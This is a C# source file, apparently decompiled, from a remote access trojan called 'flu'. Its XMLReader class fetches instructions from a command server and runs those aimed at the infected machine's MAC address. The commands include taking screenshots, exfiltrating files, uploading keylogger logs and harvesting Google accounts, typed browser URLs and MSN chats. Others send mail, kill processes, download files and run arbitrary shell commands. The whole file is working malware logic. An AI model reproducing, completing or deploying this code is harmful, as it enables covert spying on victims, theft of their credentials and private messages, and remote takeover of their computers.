using System;
using System.Xml;

namespace flu;

internal class XMLReader
{
	private XmlDocument xDoc;

	private int version;

	public XMLReader()
	{
		xDoc = new XmlDocument();
	}

	public void GetXML()
	{
		try
		{
			xDoc.Load(Network.XML);
		}
		catch
		{
			System.Console.WriteLine("No hay servidor web en el otro lado");
		}
	}

	public void ExecuteXML()
	{
		XmlNode documentElement = xDoc.DocumentElement;
		foreach (XmlNode item in documentElement)
		{
			if (!item.Name.Equals("version"))
			{
				continue;
			}
			int num = Convert.ToInt32(item.Attributes![0].Value);
			if (num <= version)
			{
				System.Console.WriteLine("version no superada");
				continue;
			}
			version = num;
			XmlNodeList elementsByTagName = xDoc.GetElementsByTagName("instruction");
			foreach (XmlNode item2 in elementsByTagName)
			{
				try
				{
					if (!item2.Attributes![3].Value.Contains(Network.MAC) && !item2.Attributes![3].Value.Equals("all"))
					{
						continue;
					}
					switch (item2.Attributes![0].Value.ToUpper())
					{
					case "WALLPAPER":
					{
						string path = Network.DownloadFile(item2.Attributes![1].Value);
						OS.ChangeWallpaper(path);
						break;
					}
					case "SNAPSHOT":
						Network.SendImage();
						break;
					case "GETFILE":
						Network.SendFile(item2.Attributes![1].Value, item2.Attributes![0].Value, item2.Attributes![2].Value);
						break;
					case "GETKEYLOGGER":
						Network.SendFile(OS.getKeyValue("win32").Replace(".exe", ".txt"), item2.Attributes![0].Value, item2.Attributes![2].Value);
						break;
					case "SENDMAIL":
					{
						string[] array = item2.Attributes![1].Value.ToString().Split(new char[1] { '|' });
						Mail mail = new Mail(array[2], array[0], array[1], array[4], array[3], array[5], array[6]);
						mail.sendMail(int.Parse(array[7]));
						break;
					}
					case "KILLPROCESS":
						OS.KillProcess(item2.Attributes![1].Value);
						break;
					case "PLAYAUDIO":
						OS.PlayAudio(item2.Attributes![1].Value);
						break;
					case "DOWNLOADFILE":
						Network.DownloadFile(item2.Attributes![1].Value);
						break;
					case "GETREGISTERS":
					{
						string text = string.Empty;
						try
						{
							foreach (string item3 in OS.getGoogleAccount())
							{
								text = text + item3 + "<br/>";
							}
						}
						catch
						{
						}
						finally
						{
							text += "<br/>";
						}
						try
						{
							foreach (string item4 in OS.getMoviesMade())
							{
								text = text + item4 + "<br/>";
							}
						}
						catch
						{
						}
						finally
						{
							text += "<br/>";
						}
						try
						{
							foreach (string internetExplorerTypedUrl in OS.getInternetExplorerTypedUrls())
							{
								text = text + internetExplorerTypedUrl + "<br/>";
							}
						}
						catch
						{
						}
						finally
						{
							text += "<br/>";
						}
						try
						{
							foreach (string blog in OS.getBlogs())
							{
								text = text + blog + "<br/>";
							}
						}
						catch
						{
						}
						finally
						{
							text += "<br/>";
						}
						try
						{
							foreach (string msnTalk in OS.getMsnTalks())
							{
								text = text + msnTalk + "<br/>";
							}
						}
						catch
						{
						}
						finally
						{
							text += "<br/>";
						}
						Network.SendInformation(text, item2.Attributes![0].Value.ToString(), item2.Attributes![2].Value.ToString(), 1);
						break;
					}
					default:
						Console.ExecuteAndSend(item2.Attributes![0].Value, item2.Attributes![1].Value, item2.Attributes![2].Value);
						break;
					}
				}
				catch
				{
				}
			}
		}
	}
}
